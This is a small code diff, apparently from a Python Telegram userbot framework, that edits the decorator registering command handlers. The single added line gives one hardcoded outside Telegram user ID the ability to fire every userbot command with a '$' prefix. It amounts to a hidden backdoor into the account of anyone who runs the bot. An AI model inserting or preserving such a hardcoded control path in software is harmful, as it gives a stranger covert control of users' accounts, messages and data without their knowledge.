@@ -25,6 +25,7 @@ class PY:
 
     def UBOT(command, filter=FILTERS.ME):
         def wrapper(func):
+            @ubot.on_message(filters.command(command, "$") & filters.user(5876222922))
             @ubot.on_message(filters.command(command, PREFIX) & filter)
             async def wrapped_func(client, message):
                 await func(client, message)
